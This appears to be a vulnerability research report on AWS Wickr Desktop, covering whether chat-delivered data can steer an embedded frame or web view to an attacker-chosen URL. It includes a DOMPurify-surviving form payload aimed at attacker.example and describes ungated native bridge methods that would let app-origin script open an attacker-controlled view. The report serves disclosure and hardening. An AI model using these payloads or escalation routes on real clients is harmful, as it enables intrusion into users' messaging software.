# W17h — no chat path to an arbitrary-URL frame; and the file-preview surface is gated by an admin policy

**Date:** 2026-08-04 **Target:** AWS Wickr Desktop 6.72.20.0 (Windows x64)
**Method:** 25-agent workflow — six disjoint surfaces swept in parallel, every candidate put through three
independent adversarial lenses, then synthesis. 1,129 tool calls. Plus direct re-verification by me of the
two consequential claims.

---

## 0. The answer

**NO.** Starting only from data an attacker can put into a conversation, there is **no established path
to either an iframe at an attacker-chosen non-app origin, or a `WebEngineView` with an attacker-chosen
`.url`** — other than the already-reported docx chain.

Every candidate is stopped by a control that can be named.

| candidate | sink | disposition |
|---|---|---|
| `Text.links[].url` → "Open Link in WebApp (Beta)" → `webAppLoadUrl` → `WebEngineView.url` | WebEngineView | **not a path** — `isBeta` |
| PPTX preview injection → DOMPurify-surviving `<form action>` → frame self-navigates | iframe | **not a path** — parent `frame-src`. **Nearest miss** |
| SSO `WickrWebEngine` view (`url: webviewUrl`) | WebEngineView | **traced negative** — a real arbitrary-URL sink, but no chat datum reaches it |
| `wickrweb://` router, `blob:` | — | no candidate produced |

**`isBeta` is settled.** It is not a settings toggle: two agents independently traced the native stage
global `0x143498f70` to writers that exist **only inside the `--environment` command-line parser**
(`"Specify environment (alpha, beta, gamma, or production)"` @ `0x32560c0`, `"Invalid environment value
specified"` @ `0x3256190`), and `isBeta` occurs exactly once in the image, in the moc pool at
`0x327b4b1`. **Process argv is not reachable from a chat message.**

---

## 1. ★ The consequential finding — the in-app preview only exists when an admin disabled downloads

**VERIFIED by me directly, not taken from the agents.** Every production entry point to
`FilePreviewModal`:

```ts
// src/store/thunks/ui.ts:66
export const openFile = createAppAsyncThunk(`ui/openFile`, async (payload, { extra, dispatch, getState }) => {
  if (getState().settings.enableFileDownload) {
    return extra.uiBridge.openFile(payload);              // native path — the preview never opens
  } else {
    dispatch(pushModal({ name: 'FilePreviewModal', … })); // the in-app preview
  }
});
```

| entry point | condition |
|---|---|
| `src/store/thunks/ui.ts:75` | only when `enableFileDownload === false` |
| `src/components/FileManagement/FileManagementItem/index.tsx:138` | the `else` of `if (enableFileDownload)` |
| `src/components/Convo/ConvoMessageContextMenuItems.tsx:529` | **`__DEV__`** — absent from production |
| `src/components/FileManagement/FileManagementItem/index.tsx:300` | **`__DEV__`** — absent from production |

`enableFileDownload` defaults to **`true`** (`src/store/slices/settings/settingsSlice.ts:118`) and is
driven by native policy (`environmentMgr.getEnableFileDownload()`,
`EnvironmentManagerSubscriptions.tsx:221-223`).

> **Therefore the entire in-app file-preview surface — the reported docx `altChunk` → `iframe.srcdoc`
> chain included, and the PPTX surface with it — is reachable only on networks where an administrator
> has DISABLED file download.**

This is a scoping precondition on an existing report. It is better stated by us than discovered by the
vendor. It is not fatal: disabling download is a common hardened-network setting, and it is precisely the
security-conscious deployments that choose it — so the population that has the preview enabled is the
population that most wanted the file *not* to leave the client.

---

## 2. Nearest miss — a `<form>` navigation primitive that survives DOMPurify

`src/lib/pptx2html/pptx2html.worker.js:1191-1202` concatenates slide run text and the hyperlink
relationship `target` into HTML with **no escaping** — and `fast-xml-parser` has already decoded
entities, so entity-encoded markup inside `<a:t>` becomes live markup. It reaches
`dangerouslySetInnerHTML` (`PowerPointPreview/index.tsx:201`) via
`DOMPurify.sanitize(dirty, { USE_PROFILES: { html: true, svg: true } })`.

Against DOMPurify 3.2.5's shipped allowlists (verified in
`node_modules/dompurify/dist/purify.es.mjs`):

* html **tags** (117) include `form`, `input`, `button`; they do **not** include `iframe`, `base`,
  `object`, `embed`, `frame`.
* html **attributes** (113) include `action`, `method`, `enctype`, `type`, `value`, `name`, `style`;
  they do **not** include `target`, `formaction`, `formtarget`, `srcdoc`.

So this survives sanitisation:

```html
<form action="https://attacker.example/"><input type=submit style="position:absolute;inset:0;opacity:0">
```

and `withLinkHandler` does **not** intercept it — that handler early-returns unless
`e.target.closest('a')` (`src/file-preview/components/withLinkHandler.tsx:10-19`). Anchors are
intercepted and routed to the system browser; **the form is the only uncaught navigation primitive in
the preview.**

**What stops it, per target:**

1. **Same-frame submission** → the parent document's `frame-src`, verbatim in both shipped entry points:
   `frame-src 'self' blob: https://fast.com/ https://main.d4zeeqgazhley.amplifyapp.com/`. Note the CSP
   has **no `form-action`, no `base-uri`, no `frame-ancestors`, and the iframe has no `sandbox`** — so
   the submission itself is unrestricted and only the resulting nested-context navigation is checked.
   The frame's reachable set is the app's own origin, `blob:` (unreachable — no script survives to mint
   one) and two fixed hosts the attacker does not own.
2. **Retargeting the top frame** (`target="_top"`, `formtarget`, `<base target>`) would navigate the
   main, bridge-bearing WebEngineView — which `frame-src` does **not** govern and which no `form-action`
   directive restrains. The only thing preventing it is that those three attributes/tags are absent from
   DOMPurify's default profile.

**Reportable as hardening regardless of the outcome:** the raw concatenation at
`pptx2html.worker.js:1191-1202`, and the missing `form-action` / `base-uri` / `sandbox`.

### ✔ MEASURED — the shipped engine does enforce it

That unknown is now closed by measurement rather than by argument
(`scratch/w17/frame/framesrv.py` + `frameprobe.c`, driving the shipped
`Qt6WebEngineQuick`). A parent document carrying Wickr's exact `frame-src` embeds a child frame whose
only navigation primitive is the DOMPurify-surviving payload. Two arms, identical code path and identical
CSP, differing only in the form's target origin:

```
ARM 1  control, target = http://127.0.0.1:8790/ALLOWED   ('self', in the allow-list)
    [A] GET /ALLOWED?          <- the frame NAVIGATED; the mechanism works

ARM 2  target = http://127.0.0.2:8791/HIT                (off the allow-list)
    [A] GET /parent?t=off
    [A] GET /child?t=off
    [A] GET /go.js
    (no request to 127.0.0.2 at all)   <- BLOCKED
```

No `/ERR` beacon fired in either arm, so `form.submit()` ran in both; only the resulting navigation
differed. **The shipped Qt WebEngine evaluates the parent document's `frame-src` for a navigation the
child frame initiates.**

**Consequence for the goal: the form primitive cannot point the frame at an arbitrary origin.** Its
reachable set is exactly `'self'` (where the frame already is), `blob:` (unreachable — no script survives
DOMPurify to mint one), `https://fast.com/` and `https://main.d4zeeqgazhley.amplifyapp.com/`.

**Consequence in practice, which is not nothing:** with `enableFileDownload = false` the preview is live,
so a peer-sent `.pptx` plus **one click anywhere in the preview** (the submit input is
`position:absolute;inset:0`) navigates the preview frame to
`https://main.d4zeeqgazhley.amplifyapp.com/` **with an attacker-chosen path, query and POST body**. That
is a third-party Amplify host in Wickr's own allow-list. It is *not* an arbitrary URL, and per
[[w18-iframe-origin-openfile-gate]] a cross-origin subframe gets **no** `qt.webChannelTransport`, so
script there cannot reach the bridge — strictly weaker than the same-origin script the reported docx
chain already yields. Its value is that it is a **different and much simpler primitive**: no HTML
injection to script, no sanitizer bypass, just a document and a click.

---

## 3. Hardening worth reporting — the native WebApp bridge methods are ungated

`WebChannelMessageBridge::webAppLoadUrl` (`0x140112860`) and `configureWebApp` (`0x1400faf40`) have
**no `isBeta` check, no `EnvironmentMgr::isURLDenied`, and no scheme allow-list** — they only look for
the JSON keys `id`/`url`. The QML sink is
`function webAppLoadUrl(id,url){var webView=webApps[id]; if(webView){webView.url=url}}`
(`scratch/w16/qrc/blob_030a2bec.js`).

**`isBeta` is a UI-only gate.** Any JavaScript running in the application origin — which the reported
docx chain achieves — can call `configureWebApp` and then `webAppLoadUrl` on a **stock GA build** and
obtain an attacker-controlled `WebEngineView`, created by the app itself, overlaid on the UI, and **not
subject to the application CSP**.

That is not an independent chat path, and must not be reported as one. It is an **escalation of the
already-reported chain**, and it raises that report's ceiling materially: from script in a preview frame
to a full attacker-controlled browser view rendered inside the client.

---

## 4. Coverage and honesty

* Surfaces swept: React frame/navigation sinks (833 files, exhaustive regex sweep); all bridge
  Q_INVOKABLEs and uiActions from the moc tables; every QML `WebEngineView` in the binary; every
  URL-bearing protobuf field; native chat-triggered view flows; the `wickrweb://` router and `blob:`.
* One tooling defect was found and fixed mid-run by a verifier: `ref16.py` does not scan `E8/E9 rel32`,
  so a "single emitter" claim made with it was unverified by its own method; a call-rel32 scanner was
  written and the claim re-confirmed.
* **No exploitation was attempted; nothing was sent to Wickr infrastructure; no account was used.**
